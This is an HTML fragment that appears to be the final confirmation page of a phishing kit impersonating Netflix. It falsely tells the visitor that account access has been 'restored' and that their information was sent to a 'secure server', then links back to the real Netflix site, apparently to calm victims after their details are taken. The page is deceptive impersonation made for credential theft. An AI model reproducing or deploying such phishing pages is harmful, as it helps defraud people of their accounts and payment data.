...
<body>
	<div>
		...
		<div class="thnk_div_main">
			<div class="thnk_div_contt">
				<div class="tnk_head">
					<img src="img/Congratulations.png">
				</div>
				<center><span class="titrtnk">Congratulations !</span></center>
				<div class="tnk_pargh">
					<p>Your have restored your account access Now you can use your account as usual all information had been sent encrypted form to our secure server Thank you for using Netflix.com</p>
				</div>
				<div>
					<a href="https://www.netflix.com"><button type="submit" name="tnk_btn" id="tnk_btn"  class="tnk-btn">Home</button></a>
				</div>
			</div>
		</div>
